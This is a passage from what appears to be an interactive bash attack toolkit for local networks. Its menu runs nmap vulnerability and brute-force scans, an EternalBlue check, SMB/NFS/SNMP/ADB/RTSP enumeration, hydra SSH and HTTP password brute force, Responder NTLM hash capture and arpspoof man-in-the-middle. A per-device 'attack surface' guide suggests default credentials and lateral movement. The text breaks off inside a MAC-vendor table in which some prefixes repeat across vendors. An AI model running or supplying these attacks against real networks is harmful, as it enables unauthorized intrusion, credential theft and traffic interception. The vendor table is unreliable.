    [[ ! "$PICK" =~ ^[0-9]+$ ]] && return
    LAN_TARGET="${LAN_HOSTS[$PICK]}"
    eval "LAN_TARGET_OS=\"\$LAN_HOST_OS_$PICK\""
    [ -z "$LAN_TARGET" ] && return

    # ---- advanced attack menu (loops) ----
    while true; do
        clear
        echo ""
        echo -e "${BOLD}${CYAN}+==============================================================+${NC}"
        printf "${BOLD}${CYAN}|${NC}  ${BOLD}TARGET  ${NC}%-18s ${BOLD}${CYAN}|${NC}  ${BOLD}GUESS ${NC}%s\n" "$LAN_TARGET" "$LAN_TARGET_OS"
        echo -e "${BOLD}${CYAN}+==============================================================+${NC}"
        echo ""
        echo -e "  ${BOLD}${GREEN}SCANNING${NC}"
        echo -e "    ${GREEN}[1]${NC}  Full port scan  ${DIM}(-p- all 65535)${NC}"
        echo -e "    ${GREEN}[2]${NC}  Service + OS fingerprint  ${DIM}(-sV -O)${NC}"
        echo -e "    ${GREEN}[3]${NC}  UDP top ports  ${DIM}(-sU --top-ports 100)${NC}"
        echo -e "    ${GREEN}[4]${NC}  Vulnerability scripts  ${DIM}(--script vuln)${NC}"
        echo -e "    ${GREEN}[5]${NC}  Service brute  ${DIM}(--script brute)${NC}"
        echo ""
        echo -e "  ${BOLD}${YELLOW}ENUMERATION${NC}"
        echo -e "    ${YELLOW}[6]${NC}  HTTP/HTTPS headers + title"
        echo -e "    ${YELLOW}[7]${NC}  SMB enum  ${DIM}(Windows/Samba shares)${NC}"
        echo -e "    ${YELLOW}[8]${NC}  SMB vuln  ${DIM}(EternalBlue MS17-010)${NC}"
        echo -e "    ${YELLOW}[9]${NC}  NFS shares  ${DIM}(showmount)${NC}"
        echo -e "    ${YELLOW}[10]${NC} SNMP walk  ${DIM}(community strings)${NC}"
        echo -e "    ${YELLOW}[11]${NC} ADB connect  ${DIM}(Android debug :5555)${NC}"
        echo -e "    ${YELLOW}[12]${NC} AirPlay/RAOP probe  ${DIM}(Apple)${NC}"
        echo -e "    ${YELLOW}[13]${NC} RTSP probe  ${DIM}(IP camera :554)${NC}"
        echo -e "    ${YELLOW}[14]${NC} SSH banner  ${DIM}(version grab)${NC}"
        echo -e "    ${YELLOW}[15]${NC} MySQL / Postgres connect  ${DIM}(if exposed)${NC}"
        echo ""
        echo -e "  ${BOLD}${RED}ATTACKS${NC}"
        echo -e "    ${RED}[16]${NC} SSH brute  ${DIM}(hydra, needs wordlist)${NC}"
        echo -e "    ${RED}[17]${NC} HTTP basic-auth brute  ${DIM}(hydra)${NC}"
        echo -e "    ${RED}[18]${NC} SMB relay capture  ${DIM}(Responder — needs tools)${NC}"
        echo -e "    ${RED}[19]${NC} ARP spoof + capture  ${DIM}(MITM, needs arpspoof)${NC}"
        echo -e "    ${RED}[20]${NC} All-in-one recon  ${DIM}(runs 1+2+4+6+14)${NC}"
        echo ""
        echo -e "  ${BOLD}${MAGENTA}INTEL${NC}"
        echo -e "    ${MAGENTA}[21]${NC} Attack surface report for this device"
        echo -e "    ${MAGENTA}[22]${NC} Save full report to logs/"
        echo ""
        echo -e "    ${RED}[0]${NC}  Back"
        echo ""
        read -p "$(echo -e ${BOLD}${YELLOW}'Choice: '${NC})" DCH
        case "$DCH" in
            1) sudo nmap -Pn -T4 -p- "$LAN_TARGET" | tee "$LOGS_DIR/lan_full_${LAN_TARGET}.txt"; pause ;;
            2) sudo nmap -Pn -T4 -sV -O "$LAN_TARGET" | tee "$LOGS_DIR/lan_sv_${LAN_TARGET}.txt"; pause ;;
            3) sudo nmap -Pn -T4 -sU --top-ports 100 "$LAN_TARGET" | tee "$LOGS_DIR/lan_udp_${LAN_TARGET}.txt"; pause ;;
            4) sudo nmap -Pn -T4 --script vuln "$LAN_TARGET" | tee "$LOGS_DIR/lan_vuln_${LAN_TARGET}.txt"; pause ;;
            5) sudo nmap -Pn -T4 --script brute "$LAN_TARGET" | tee "$LOGS_DIR/lan_brute_${LAN_TARGET}.txt"; pause ;;
            6)
                for scheme in http https; do
                    echo -e "${CYAN}[*] $scheme://$LAN_TARGET${NC}"
                    curl -skI --max-time 5 "$scheme://$LAN_TARGET/" 2>/dev/null | head -10
                    local title
                    title=$(curl -sk --max-time 5 "$scheme://$LAN_TARGET/" 2>/dev/null | grep -oiE '<title>[^<]*</title>' | head -1)
                    [ -n "$title" ] && echo -e "  Title: $title"
                    echo ""
                done
                pause ;;
            7)
                command -v smbclient >/dev/null 2>&1 || sudo apt install -y smbclient 2>&1 | tail -2
                smbclient -L "//$LAN_TARGET/" -N 2>&1 | head -30
                pause ;;
            8)
                sudo nmap -Pn -p 445 --script smb-vuln-ms17-010 "$LAN_TARGET" 2>&1 | tee "$LOGS_DIR/lan_ms17010_${LAN_TARGET}.txt"
                pause ;;
            9)
                command -v showmount >/dev/null 2>&1 || sudo apt install -y nfs-common 2>&1 | tail -2
                showmount -e "$LAN_TARGET" 2>&1
                pause ;;
            10)
                command -v snmpwalk >/dev/null 2>&1 || sudo apt install -y snmp 2>&1 | tail -2
                for c in public private manager admin; do
                    echo -e "${CYAN}[*] community '$c':${NC}"
                    timeout 5 snmpwalk -v2c -c "$c" "$LAN_TARGET" sysDescr 2>&1 | head -3
                done
                pause ;;
            11)
                command -v adb >/dev/null 2>&1 || sudo apt install -y adb 2>&1 | tail -2
                adb connect "$LAN_TARGET:5555" 2>&1
                sleep 1
                adb devices 2>&1
                pause ;;
            12)
                python3 - "$LAN_TARGET" <<'PYEOF'
import socket, sys
ip = sys.argv[1]
for port in [5000, 7000, 7100, 3689, 62078]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
    try:
        s.connect((ip, port)); print(f"  port {port} OPEN")
    except Exception:
        print(f"  port {port} closed")
    s.close()
PYEOF
                pause ;;
            13)
                command -v ffprobe >/dev/null 2>&1 || echo -e "${DIM}install ffmpeg for full probe${NC}"
                for path in /stream1 /stream2 /live /video /h264 /11 /onvif-http/snapshot; do
                    timeout 3 curl -sk "rtsp://$LAN_TARGET:554$path" 2>&1 | head -2 &
                done
                wait 2>/dev/null
                echo -e "${DIM}    also try: vlc rtsp://$LAN_TARGET:554/stream1${NC}"
                pause ;;
            14)
                timeout 3 nc -nv "$LAN_TARGET" 22 2>&1 | head -3
                pause ;;
            15)
                for p in 3306 5432; do
                    echo -e "${CYAN}[*] port $p:${NC}"
                    timeout 3 nc -nvz "$LAN_TARGET" "$p" 2>&1 && \
                        echo -e "  ${GREEN}open${NC}" || echo -e "  ${DIM}closed${NC}"
                done
                pause ;;
            16)
                command -v hydra >/dev/null 2>&1 || sudo apt install -y hydra 2>&1 | tail -2
                read -p "$(echo -e ${YELLOW}'Username (or userlist path): '${NC})" U
                read -p "$(echo -e ${YELLOW}'Password list [rockyou]: '${NC})" W
                W="${W:-/usr/share/wordlists/rockyou.txt}"
                hydra -l "$U" -P "$W" "ssh://$LAN_TARGET" 2>&1 | tail -20
                pause ;;
            17)
                command -v hydra >/dev/null 2>&1 || sudo apt install -y hydra 2>&1 | tail -2
                read -p "$(echo -e ${YELLOW}'Username: '${NC})" U
                read -p "$(echo -e ${YELLOW}'Password list [rockyou]: '${NC})" W
                W="${W:-/usr/share/wordlists/rockyou.txt}"
                hydra -l "$U" -P "$W" "http-get://$LAN_TARGET/" 2>&1 | tail -20
                pause ;;
            18)
                command -v responder >/dev/null 2>&1 || { echo -e "${YELLOW}Responder not installed.${NC}"; echo -e "${DIM}    sudo apt install responder${NC}"; pause; return; }
                echo -e "${CYAN}[*] Running Responder for 60s on this network...${NC}"
                echo -e "${DIM}    Captures NTLM hashes from Windows hosts trying to authenticate.${NC}"
                sudo timeout 60 responder -I "$(lan_get_my_net "" | cut -d'|' -f1)" -rdwv 2>&1 | tail -30
                pause ;;
            19)
                command -v arpspoof >/dev/null 2>&1 || { echo -e "${YELLOW}arpspoof not installed.${NC}"; echo -e "${DIM}    sudo apt install dsniff${NC}"; pause; return; }
                read -p "$(echo -e ${YELLOW}'Gateway IP: '${NC})" GW
                [ -z "$GW" ] && { pause; return; }
                local ifc=$(lan_get_my_net "" | cut -d'|' -f1)
                echo -e "${CYAN}[*] Enabling IP forwarding...${NC}"
                sudo sysctl -w net.ipv4.ip_forward=1 >/dev/null
                echo -e "${CYAN}[*] ARP spoofing $LAN_TARGET <-> $GW on $ifc${NC}"
                echo -e "${DIM}    Ctrl+C to stop.${NC}"
                sudo arpspoof -i "$ifc" -t "$LAN_TARGET" "$GW" &
                sudo arpspoof -i "$ifc" -t "$GW" "$LAN_TARGET" &
                wait
                pause ;;
            20)
                echo -e "${CYAN}[*] All-in-one recon on $LAN_TARGET${NC}"
                echo "--- port scan ---"
                sudo nmap -Pn -T4 --top-ports 1000 "$LAN_TARGET" | tail -30
                echo "--- service + OS ---"
                sudo nmap -Pn -T4 -sV -O "$LAN_TARGET" | tail -30
                echo "--- vuln scripts ---"
                sudo nmap -Pn -T4 --script vuln "$LAN_TARGET" | tail -40
                echo "--- HTTP ---"
                curl -skI --max-time 5 "http://$LAN_TARGET/" 2>/dev/null | head -8
                echo "--- SSH ---"
                timeout 3 nc -nv "$LAN_TARGET" 22 2>&1 | head -3
                pause ;;
            21)
                echo ""
                echo -e "${BOLD}${CYAN}=== Attack surface: $LAN_TARGET ($LAN_TARGET_OS) ===${NC}"
                case "$LAN_TARGET_OS" in
                    *iPhone*|*iPad*|*Apple*)
                        echo -e "  ${YELLOW}Apple device — very hard to attack from LAN${NC}"
                        echo -e "  AirPlay (7000) — try option 12"
                        echo -e "  No SMB, no ADB, no open SSH"
                        echo -e "  ${DIM}Realistic attack: BLE spam (Bluetooth menu, option 12)${NC}"
                        ;;
                    *Windows*)
                        echo -e "  ${YELLOW}Windows PC${NC}"
                        echo -e "  SMB 445 → EternalBlue (option 8), relay (option 18)"
                        echo -e "  RDP 3389 → brute (option 17 against RDP endpoint)"
                        echo -e "  WinRM 5985/5986 → lateral movement if creds found"
                        ;;
                    *Android*)
                        echo -e "  ${YELLOW}Android${NC}"
                        echo -e "  ADB 5555 (option 11) — works only if debug-over-network enabled"
                        echo -e "  KDE Connect 1716 — file transfer, sometimes unauthenticated"
                        echo -e "  FTP apps — check for port 2121, 2122"
                        ;;
                    *Linux*|*server*)
                        echo -e "  ${YELLOW}Linux server${NC}"
                        echo -e "  SSH 22 → brute (option 16)"
                        echo -e "  HTTP 80/443 → web module tests"
                        echo -e "  MySQL 3306 / Postgres 5432 → connect (option 15)"
                        ;;
                    *Printer*)
                        echo -e "  ${YELLOW}Printer${NC}"
                        echo -e "  Web admin 80 → default creds (admin/admin, admin/1234)"
                        echo -e "  Raw print 9100 → print job injection"
                        ;;
                    *camera*|*RTSP*)
                        echo -e "  ${YELLOW}IP camera${NC}"
                        echo -e "  RTSP 554 (option 13) — often unauthenticated"
                        echo -e "  Web admin 80 → default creds (admin/admin, root/root)"
                        ;;
                    *) echo -e "  ${DIM}Unknown type — run options 1, 2, 4, 20 first${NC}" ;;
                esac
                pause ;;
            22)
                local rep="$LOGS_DIR/lan_report_${LAN_TARGET}_$(date +%s).txt"
                {
                    echo "=== LAN Report for $LAN_TARGET ==="
                    echo "OS guess: $LAN_TARGET_OS"
                    echo "Date: $(date)"
                    echo ""
                    echo "--- ports ---"
                    sudo nmap -Pn -T4 --top-ports 1000 "$LAN_TARGET"
                    echo ""
                    echo "--- services ---"
                    sudo nmap -Pn -T4 -sV "$LAN_TARGET"
                    echo ""
                    echo "--- HTTP ---"
                    curl -skI --max-time 5 "http://$LAN_TARGET/"
                    echo ""
                } | tee "$rep"
                echo -e "${GREEN}[+] Saved to $rep${NC}"
                pause ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

lan_pick_iface() {
    print_banner
    echo -e "${BOLD}${CYAN}========= PICK A NETWORK INTERFACE =========${NC}"
    echo ""
    echo -e "${DIM}    Which network do you want to work on?${NC}"
    echo ""

    local ifaces=()
    local labels=()
    local ips=()
    local i=0
    while read -r line; do
        # strip trailing @ifN: or : markers from the name
        local name
        name=$(echo "$line" | awk '{print $2}' | sed 's/@.*//; s/:$//')
        [ "$name" = "lo" ] && continue
        local ip
        ip=$(ip -4 -o addr show "$name" 2>/dev/null | awk '{print $4}' | head -1 | cut -d/ -f1)
        ifaces+=("$name")
        ips+=("${ip:--}")
        case "$name" in
            wlan*) labels+=("Wi-Fi ($name)") ;;
            eth*)  labels+=("Ethernet ($name)") ;;
            *)     labels+=("$name") ;;
        esac
    done < <(ip -o link show 2>/dev/null)

    if [ ${#ifaces[@]} -eq 0 ]; then
        echo -e "${RED}[!] No network interfaces found.${NC}"
        pause
        return 1
    fi

    local n=1
    for i in "${!ifaces[@]}"; do
        local mark=""
        [ "${ips[$i]}" != "-" ] && mark="${GREEN}[UP]${NC}" || mark="${DIM}[down]${NC}"
        printf "  ${BOLD}%-4s${NC} %-24s %-20s %s\n" "$n" "${labels[$i]}" "${ips[$i]}" "$mark"
        eval "LAN_PICK_NAME_$n=\"${ifaces[$i]}\""
        n=$((n+1))
    done

    echo ""
    read -p "$(echo -e ${YELLOW}'Pick number (blank=auto): '${NC})" P

    if [ -n "$P" ] && [[ "$P" =~ ^[0-9]+$ ]] && [ "$P" -ge 1 ] && [ "$P" -lt "$n" ]; then
        eval "LAN_IFACE=\"\$LAN_PICK_NAME_$P\""
    else
        LAN_IFACE=""
    fi

    # sanitize — strip anything that isn't alphanumeric
    LAN_IFACE=$(echo "$LAN_IFACE" | sed 's/[^a-zA-Z0-9]//g')

    local info
    info=$(lan_get_my_net "$LAN_IFACE")
    if [ -z "$info" ]; then
        echo -e "${RED}[!] Chosen interface has no IP. Try another, or connect first.${NC}"
        pause
        return 1
    fi
    echo ""
    echo -e "${GREEN}[+] Using: $info${NC}"
    sleep 1
    return 0
}

lan_show_net_info() {
    print_banner
    echo -e "${BOLD}${CYAN}========= MY NETWORK =========${NC}"
    local info
    info=$(lan_get_my_net "")
    if [ -z "$info" ]; then
        echo -e "${RED}[!] No active network interface.${NC}"
        echo -e "${DIM}    Connect to WiFi or plug in Ethernet first.${NC}"
        echo ""
        echo -e "${CYAN}All interfaces:${NC}"
        ip -o link show | awk -F': ' '{print "  " $2 "  " $3}' | head
        pause; return
    fi
    local iface="${info%%|*}"
    local cidr="${info##*|}"
    echo -e "  ${BOLD}Interface:${NC} $iface"
    echo -e "  ${BOLD}CIDR:${NC}      $cidr"
    echo -e "  ${BOLD}IP:${NC}        $(ip -4 -o addr show "$iface" | awk '{print $4}' | head -1 | cut -d/ -f1)"
    echo -e "  ${BOLD}MAC:${NC}       $(cat /sys/class/net/$iface/address 2>/dev/null)"
    echo -e "  ${BOLD}Gateway:${NC}   $(ip route | awk '/^default/ {print $3; exit}')"
    echo -e "  ${BOLD}DNS:${NC}       $(grep nameserver /etc/resolv.conf 2>/dev/null | awk '{print $2}' | tr '\n' ' ')"
    echo ""
    echo -e "${CYAN}All interfaces:${NC}"
    ip -4 -o addr show | awk '$2!="lo" {print "  " $2 "  " $4}'
    pause
}

# ===============================================================
# Device history + naming
# ===============================================================

LAN_HISTORY="$BASE_DIR/lan_history.txt"

# fingerprint: read the vendor from MAC OUI. Returns a "PC (Dell)", "iPhone", etc.
lan_fingerprint_mac() {
    local mac="$1"
    [ -z "$mac" ] && { echo "Unknown"; return; }
    local mac_upper
    mac_upper=$(echo "$mac" | tr '[:lower:]' '[:upper:]' | cut -d: -f1-3)
    case "$mac_upper" in
        # Apple
        00:1B:63|00:1E:C2|00:23:DF|00:25:00|00:26:B0|00:26:BB|00:30:65|00:3E:E1|00:50:E4|00:56:CD|00:61:71|00:6D:52|00:88:65|00:B3:62|00:C6:10|00:CD:FE|00:DB:70|00:F4:B9|00:F7:6F|04:0C:CE|04:15:52|04:1E:64|04:26:65|04:48:9A|04:52:F3|04:54:53|04:69:F8|04:D3:CF|04:DB:56|04:E5:36|04:F1:3E|04:F7:E4|04:FE:31) echo "Apple (likely iPhone / iPad / Mac)" ;;
        # Samsung
        00:12:FB|00:15:99|00:16:32|00:16:6B|00:16:6C|00:16:DB|00:17:C9|00:17:D5|00:1A:8A|00:1D:25|00:1D:F6|00:1E:7D|00:1E:E1|00:1F:CC|00:1F:CD|00:21:19|00:21:4C|00:21:D1|00:21:D2|00:23:39|00:23:3A|00:23:D6|00:23:D7|00:24:54|00:24:90|00:24:91|00:25:38|00:25:66|00:25:67|00:26:37|00:26:5D|00:26:5F) echo "Samsung (Galaxy phone / tablet)" ;;
        # Huawei
        00:1E:10|00:25:9E|00:34:FE|00:46:4B|00:66:4B|00:9A:CD|04:02:1F|04:25:C5|04:33:89|04:4F:4C|04:75:03|04:BD:70|04:C0:6F|04:F9:38|04:FE:8D|08:19:A6|08:63:61|0C:37:DC|0C:96:BF|0C:D6:BD|10:1B:54|10:47:80|10:C6:1F) echo "Huawei" ;;
        # Xiaomi
        00:9E:C8|04:CF:8C|0C:1D:AF|10:2A:B3|14:F6:5A|18:59:36|20:47:DA|20:82:C0|28:6C:07|28:E3:1F|2C:AB:33|34:80:B3|34:CE:00|38:A4:ED|3C:BD:D8|40:31:3C|44:23:7C|4C:49:E3|50:8F:4C|50:EC:50|58:44:98|5C:02:14|64:09:80|64:CC:2E|68:AB:BC|74:23:44|74:51:BA|78:02:F8|78:11:DC|7C:1D:D9|7C:49:EB|8C:BE:BE|8C:F7:10|98:FA:E3|9C:99:A0|A0:86:C6|AC:C1:EE|AC:CF:5C|B0:E2:35|C4:0B:CB|C4:6A:B7|D4:97:0B) echo "Xiaomi" ;;
        # Google
        3C:28:6D|3C:5A:B4|40:4E:36|44:80:EB|54:60:09|64:16:66|94:EB:2C|A4:77:33|B4:07:F9|D8:6C:63|F4:F5:D8|F4:F5:E8|F8:8F:CA) echo "Google (Pixel / Nest)" ;;
        # OnePlus
        04:5F:A7|08:37:3D|0C:1D:AF|1C:87:2C|34:8C:EA|40:A3:6B|64:A2:F9|94:65:2D|AC:56:2C|B0:5E:0E|C0:EE:FB) echo "OnePlus" ;;
        # Roku, Chromecast, Fire TV
        00:04:4B|00:0D:4B|08:05:81|20:F5:43|48:A4:72|6C:AD:F8|94:EB:2C|B0:A7:37|D8:31:34|DC:44:6D) echo "Streaming device (Roku / Chromecast / Fire TV)" ;;
        # Raspberry Pi
        B8:27:EB|DC:A6:32|E4:5F:01|28:CD:C1) echo "Raspberry Pi" ;;
        # VMware
        00:0C:29|00:1C:14|00:50:56|00:05:69) echo "VMware VM" ;;
        # VirtualBox
        08:00:27|0A:00:27) echo "VirtualBox VM" ;;
        # HP printers
        00:1E:0B|00:21:5A|00:24:81|00:25:B3|00:26:55|00:60:B0|00:99:0E|00:A0:98|00:D0:59|00:E0:18|00:E0:4F|3C:D9:2B|40:A8:F0|44:1E:A1|48:0F:CF|50:65:F3|54:80:28|68:B5:99|6C:C2:17|70:10:6F|74:46:A0|78:E3:B5|80:C1:6E|84:34:97|94:57:A5|98:E7:F4|9C:B6:54|A0:1D:48|A0:48:1C|A0:B3:39|AC:16:2D|B0:5A:DA|B4:99:BA|BC:EA:FA|C0:99:6D|C4:34:6B|C8:CB:B8|D0:BF:9C|D4:85:64|D8:9D:67|DC:4A:3E|E4:11:5B|EC:9A:74|F0:92:1C|F4:CE:46|FC:15:B4) echo "HP (likely printer)" ;;
        # Canon printers
        00:00:85|00:1E:8F|00:3A:98|18:0C:AC|2C:9E:FC|3C:D9:2B|70:4D:7B|88:87:17|AC:67:84|B4:82:C5) echo "Canon (likely printer)" ;;
        # Cisco
        00:00:0C|00:1A:A1|00:1B:D5|00:1C:B0|00:1D:45|00:1D:A1|00:1E:13|00:1E:14|00:1E:49|00:1E:4A|00:1E:BD|00:1E:F7|00:1F:26|00:1F:27|00:1F:6C|00:1F:6D|00:1F:9E|00:1F:CA|00:22:0C|00:22:90|00:22:91|00:22:BD|00:22:BE|00:23:04|00:23:05|00:23:5E|00:23:5F|00:23:AB|00:23:AC|00:23:EA|00:23:EB|00:24:14|00:24:97|00:24:98|00:24:C4|00:25:45|00:25:84|00:25:85|00:26:0A|00:26:0B|00:26:51|00:26:52|00:26:CA|00:26:CB) echo "Cisco (router / switch / AP)" ;;
        # TP-Link
        00:0A:EB|00:14:78|00:19:E0|00:1D:0F|00:21:27|00:22:A5|00:23:CD|00:25:86|00:27:19|04:9F:CA|08:57:00|0C:80:63|10:27:F5|10:FE:ED|14:CC:20|14:CF:92|18:A6:F7|1C:3B:F3|1C:FA:68|20:4E:7F|28:2C:B2|28:87:BA|30:B4:9E|30:B5:C2|34:60:F9|34:E8:94|38:83:45|3C:46:D8|40:16:9F|44:94:FC|48:8F:5A|50:64:2B|50:C7:BF|54:A7:03|54:C8:0F|5C:63:BF|5C:89:9A|60:32:B1|60:3A:7C|64:56:01|64:66:B3|64:6E:97|68:57:2D|68:FF:7B|6C:5A:B0|6C:E8:73|70:4F:57|70:EE:50|74:DA:88|74:EA:3A|78:44:76|78:A1:06|7C:8B:CA|80:EA:07|84:16:F9|88:25:93|8C:21:0A|90:F6:52|94:0C:6D|98:DA:C4|9C:53:22|A0:F3:C1|A4:2B:B0|A8:57:4E|AC:84:C6|B0:48:7A|B0:4E:26|B0:95:75|BC:46:99|C0:06:C3|C0:25:E9|C0:4A:00|C4:6E:1F|C4:E9:84|C8:0E:14|C8:3A:35|CC:32:E5|CC:68:B6|D0:76:E7|D8:07:B6|D8:47:32|DC:9F:DB|E4:C3:2A|E8:94:F6|E8:DE:27|EC:08:6B|EC:17:2F|EC:88:8F|F0:9F:C2|F4:28:53|F4:83:CD|F4:EC:38|F8:1A:67|F8:D1:11|FC:7C:02) echo "TP-Link" ;;
        # D-Link
        00:11:95|00:13:46|00:15:E9|00:17:9A|00:19:5B|00:1B:11|00:1C:F0|00:1E:58|00:21:91|00:22:B0|00:24:01|00:26:5A|04:2F:56|08:12:A5|0C:D6:BD|10:62:EB|14:D6:4D|18:9B:A5|1C:7E:E5|1C:AF:F7|28:10:7B|28:37:37|28:AF:FD|2C:AB:00|34:08:04|3C:1E:04|40:9B:CD|48:EE:0C|50:FA:84|54:B8:0A|5C:D9:98|60:63:4C|64:8D:00|6C:72:20|70:62:B8|74:D0:2B|78:32:1B|78:54:2E|7C:8B:CA|84:C9:B2|8C:64:0D|90:94:E4|94:0C:6D|9C:D6:43|A0:AB:1B|A4:07:B6|AC:39:8E|B0:C5:54|B8:A3:86|BC:0F:9A|BC:F6:85|C4:12:F5|C8:BE:19|CC:B2:55|D0:21:F9|D8:FE:E3|DC:0B:34|E0:1C:FC|E4:6F:13|E8:CC:18|EC:22:80|F0:7D:68|F0:B4:79|F4:8E:38|F8:1A:67|FC:75:16) echo "D-Link" ;;
        # Realtek
        00:E0:4C|00:10:20|10:20:10) echo "Realtek chipset device" ;;
        # Intel
        00:02:B3|00:03:47|00:04:23|00:0C:F1|00:0E:0C|00:11:11|00:13:02|00:13:20|00:13:CE|00:13:E8|00:15:00|00:15:17|00:16:6F|00:16:76|00:16:EA|00:16:EB|00:18:DE|00:19:D1|00:19:D2|00:1B:21|00:1B:77|00:1C:BF|00:1D:BA|00:1E:64|00:1E:65|00:1E:67|00:1F:3B|00:1F:3C|00:21:5C|00:21:5D|00:21:6A|00:21:6B|00:22:FA|00:22:FB|00:23:14|00:23:15|00:23:6C|00:23:6D|00:24:D6|00:24:D7|00:26:C6|00:26:C7|00:27:10|04:0E:3C|04:7D:7B|04:95:E6|04:A3:16|04:D3:B0|04:E5:36|04:EA:56|04:F1:28|04:F7:E4|08:11:96|08:3A:88|08:D4:0C|0C:8B:FD|0C:DD:24|10:02:B5|10:0B:A9|10:78:D2|10:98:C3|10:BF:48|10:DD:B1|14:10:9F|14:4F:8A|14:5A:05|14:A3:64|18:03:73|18:3D:A2|18:5E:0F|18:CF:5E|1C:1B:0D|1C:3E:84|1C:69:7A|1C:99:4C|1C:BF:CE|20:16:D8|20:37:06|20:47:47|20:68:9D|20:79:18|20:89:84|20:91:48|20:A7:83|24:0A:64|24:77:03|24:FD:52|28:16:2E|28:C6:8E|28:D2:44|2C:33:7A|2C:44:FD|2C:56:DC|2C:60:0C|2C:F0:EE|30:3A:64|30:E3:7A|34:02:86|34:13:E8|34:97:F6|34:E6:D7|38:3A:21|38:59:F9|38:B1:DB|3C:97:0E|3C:A9:F4|3C:F0:11|40:16:3E|40:25:C2|40:74:E0|40:99:22|40:B0:34|40:E2:30|44:03:2C|44:11:C2|44:6D:57|44:85:00|44:8A:5B|44:D9:E7|48:0F:CF|48:45:20|48:51:B7|48:DF:37|4C:34:88|4C:79:BA|4C:EB:42|50:2F:A8|50:76:AF|50:9A:4C|50:EB:71|54:26:96|54:35:30|54:4A:16|54:6C:0E|54:A0:50|54:E0:32|58:91:CF|58:94:6B|58:A0:23|5C:51:4F|5C:5F:67|5C:80:B6|5C:C5:D4|5C:E0:C5|60:02:92|60:36:DD|60:57:18|60:67:20|60:6C:66|60:88:05|60:8D:26|60:F2:62|64:4B:F0|64:5D:86|64:80:99|64:9C:81|64:A7:69|64:D4:DA|68:05:CA|68:07:15|68:17:29|68:5D:43|68:94:23|68:DB:F5|68:EB:AE|68:EC:C5|6C:29:95|6C:88:14|6C:8D:C4|6C:94:66|6C:A1:00|6C:B3:11|6C:F3:7F|70:1C:E7|70:38:EE|70:5A:0F|70:72:3C|70:77:81|70:8B:CD|70:E7:2C|70:F3:95|74:29:AF|74:70:FD|74:86:7A|74:A4:B5|74:C6:3B|74:E5:0B|74:F0:6D|78:0C:B8|78:31:C1|78:92:9C|78:9E:D0|78:A3:E4|78:FF:57|7C:2A:31|7C:5C:F8|7C:61:66|7C:7A:91|7C:8B:CA|7C:D3:0A|80:00:0B|80:19:34|80:32:53|80:58:F8|80:6C:1B|80:86:F2|80:9B:20|80:CE:62|80:E6:50|84:16:F9|84:3A:4B|84:4B:F5|84:5C:F3|84:76:16|84:8E:0C|84:A9:C4|84:C5:A6|84:EB:18|84:EF:18|88:36:6C|88:53:2E|88:6B:0F|88:78:73|88:88:88|88:AE:1D|88:B1:11|88:B6:EE|88:C9:E8|88:E9:FE|8C:16:45|8C:4B:14|8C:55:4A|8C:70:5A|8C:89:A5|8C:A9:82|8C:B8:4A|8C:DC:D4|8C:F3:19|90:1B:0E|90:2E:1C|90:49:FA|90:4C:E5|90:5C:44|90:61:AE|90:78:B2|90:7F:61|90:94:E4|90:B1:1C|90:E2:02|94:39:E5|94:53:30|94:65:9C|94:6A:77|94:70:72|94:7E:B9|94:C6:91|94:E9:79|94:EB:2C|94:F6:A3|98:4F:EE|98:5F:D3|98:90:96|98:AF:65|98:B8:BA|98:DA:C4|98:E7:F4|98:F1:70|98:F2:B3|9C:2A:70|9C:30:5B|9C:4E:36|9C:5C:8E|9C:7B:D2|9C:8E:99|9C:99:A0|9C:B6:D0|9C:D6:43|9C:DA:3E|A0:36:9F|A0:48:1C|A0:51:0B|A0:88:69|A0:88:B4|A0:A8:CD|A0:AF:BD|A0:B3:39|A0:C5:89|A0:D3:C1|A0:E0:AF|A0:EC:80|A4:02:B9|A4:4C:C8|A4:5D:36|A4:5E:60|A4:6B:B6|A4:77:33|A4:7B:9D|A4:83:E7|A4:99:47|A4:A6:A9|A4:AD:B8|A4:B1:C1|A4:C4:94|A4:D1:8C|A4:E9:75|A8:66:7F|A8:6B:AD|A8:7C:01|A8:88:08|A8:9C:ED|A8:B1:D4|A8:BB:CF|A8:D0:E5|A8:E3:EE|A8:F7:E0|AA:00:04|AC:16:2D|AC:22:0B|AC:2B:6E|AC:4B:C8|AC:5F:3E|AC:61:EA|AC:72:89|AC:74:B1|AC:7B:A1|AC:81:12|AC:9B:0A|AC:A3:1E|AC:AB:8E|AC:B5:7D|AC:BC:32|AC:C1:EE|AC:E0:10|AC:E2:D3|AC:ED:5C|AC:F1:08|AC:F9:7E|AC:FD:CE|B0:0C:D1|B0:35:9F|B0:48:7A|B0:5A:DA|B0:6E:BF|B0:7B:25|B0:83:FE|B0:9F:BA|B0:A7:37|B0:AA:36|B0:B9:8A|B0:C4:E7|B0:C7:45|B0:D0:9C|B0:E2:35|B0:E7:54|B0:EB:57|B0:F1:EC|B4:04:18|B4:05:66|B4:0B:44|B4:14:89|B4:2A:0E|B4:30:52|B4:38:D2|B4:45:06|B4:47:5E|B4:52:7D|B4:52:7E|B4:62:93|B4:6B:FC|B4:74:43|B4:79:A7|B4:96:91|B4:99:4C|B4:9C:DF|B4:A3:82|B4:A4:E3|B4:AE:2B|B4:B6:76|B4:B8:59|B4:CE:F6|B4:D5:BD|B4:E6:2A|B4:E9:B0|B4:EF:39|B4:F0:AB|B4:F1:DA|B4:F7:A1|B8:08:CF|B8:08:D7|B8:17:C2|B8:1E:A4|B8:2A:72|B8:3A:5A|B8:44:D9|B8:4F:D5|B8:5A:73|B8:5E:7B|B8:60:91|B8:69:F4|B8:6B:23|B8:70:F4|B8:76:3F|B8:81:98|B8:86:87|B8:88:E3|B8:8A:60|B8:8A:EC|B8:8E:3A|B8:8F:14|B8:97:5A|B8:98:B0|B8:9A:2A|B8:9E:A6|B8:A1:75|B8:A3:86|B8:A5:8D|B8:AC:6F|B8:AD:3E|B8:AE:6E|B8:B1:C7|B8:B3:7B|B8:B4:2E|B8:B7:D7|B8:B8:1F|B8:B9:81|B8:BB:AF|B8:BC:1B|B8:BE:BF|B8:C1:11|B8:C3:85|B8:C6:8E|B8:C7:5D|B8:C8:EB|B8:CA:3A|B8:CB:29|B8:CD:93|B8:D4:9D|B8:D5:0B|B8:D7:AF|B8:D8:12|B8:D9:4D|B8:DA:F7|B8:DB:38|B8:DC:87|B8:DD:71|B8:DE:5E|B8:DF:6B|B8:E0:AA|B8:E3:B1|B8:E5:C6|B8:E6:0C|B8:E8:56|B8:E9:37|B8:EA:AA|B8:EB:BF|B8:EC:A3|B8:EE:0E|B8: